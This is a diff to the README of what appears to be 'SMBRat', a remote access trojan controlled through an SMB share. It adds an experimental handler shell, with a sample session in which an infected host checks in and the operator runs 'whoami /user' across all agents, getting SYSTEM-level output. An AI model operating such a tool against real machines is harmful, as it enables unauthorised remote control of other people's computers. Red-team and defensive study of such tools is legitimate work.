@@ -59,7 +59,7 @@ It is also possible to utilize the `WMI` tool by local access to install the `ag
 
 
 
-## Usage
+## Barebone Usage
 
 At time of writing, no `Handler` shell is implemented, so usage can be done by just using a command like `watch` to inspect the `output.dat` file:
 
@@ -73,12 +73,35 @@ $ echo 'whoami /all' > Share/projectName/DESKTOP-XXXXXXX-AA\:BB\:CC\:DD\:EE\:FF/
 
 Yet, in the near future, a Python CLI will be implememted to automate the above tasks and also contain:
 
-* Command History
-* Output History (will make reporting a lot easier)
-* File Download
+
+## The `handler.py`
+
+The experimental shell works as follows: 
+```bash
+$ python handler.py Share/
+SMBRat> 
+# When a new host gets infected:
+[+] Agent "DESKTOP-EG4OE7J" (00:0C:29:2B:9F:AF) just checked in for Project: "projectName"
+
+SMBRat> execall whoami /user
+
+[>] Sending 'whoami /user' to "projectName/DESKTOP-EG4OE7J-00:0C:29:2B:9F:AF" ...
+		
+SMBRat> 
+[<] Response from 'projectName/DESKTOP-EG4OE7J-00:0C:29:2B:9F:AF': 
 
 
+USER INFORMATION
+----------------
 
+User Name           SID     
+=================== ========
+nt authority\system S-1-5-18
+
+^^^^^^^^^^^^^^^^^^^^ projectName/DESKTOP-EG4OE7J-00:0C:29:2B:9F:AF ^^^^^^^^^^^^^^^^^^^^
+SMBRat> 
+				
+```
 
 ## Outstanding Pitfalls
 
